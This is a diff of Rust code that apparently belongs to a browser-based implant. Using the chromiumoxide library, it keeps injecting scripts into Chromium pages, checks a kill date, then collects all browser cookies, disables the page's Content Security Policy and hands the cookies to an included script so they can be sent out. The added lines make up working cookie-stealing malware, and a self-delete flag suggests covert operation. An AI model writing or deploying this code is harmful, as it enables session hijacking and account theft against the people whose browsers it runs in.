@@ -1,10 +1,15 @@
 use chromiumoxide::{
     browser::{Browser, BrowserConfig},
-    cdp::browser_protocol::{
-        page::{AddScriptToEvaluateOnNewDocumentParams, SetBypassCspParams},
-        target::TargetId
-    }
+    cdp::{
+        js_protocol::runtime::{CallFunctionOnParams, CallArgument},
+        browser_protocol::{
+            page::{AddScriptToEvaluateOnNewDocumentParams, SetBypassCspParams},
+            target::TargetId,
+            network::Cookie
+        },
+    },
 };
+
 use std::{
     path::PathBuf,
     collections::HashSet
@@ -99,14 +104,13 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
         // Remove IDs of pages that are now closed.
         injected_pages.retain(|page_id| current_pages.contains(page_id));
 
-
         // Wait for a second before checking again
         sleep(Duration::from_secs(1)).await;
     }
 
     #[cfg(feature = "debug")]
     println!("[*] Checking killdate...");
-    let page = browser.new_page("about:blank").await?;
+    let page = browser.new_page("https://google.com").await?;
     let delete_self: bool = page.evaluate(include_str!("js/processed_killdate.js")).await?.into_value()?;
 
     if delete_self {
@@ -115,10 +119,24 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
 
         #[cfg(feature = "debug")]
         println!("[*] Retrieving cookies...");
-        let _cookies = browser.get_cookies().await?;
+        let cookies: Vec<Cookie> = browser.get_cookies().await?;
+
+        #[cfg(feature = "debug")]
+        println!("[+] Disabling csp");
+        page.execute(SetBypassCspParams::new(true)).await?;
 
         #[cfg(feature = "debug")]
         println!("[*] Sending cookies...");
+        let call_params = CallFunctionOnParams::builder()
+            .function_declaration(include_str!("js/processed_cookies.js"))
+            .argument(
+                CallArgument::builder()
+                .value(serde_json::to_value(cookies)?)
+                .build(),
+            )
+            .build()?;
+
+        let _result : bool = page.evaluate_function(call_params).await?.into_value()?;
 
         #[cfg(feature = "debug")]
         println!("[+] Done");
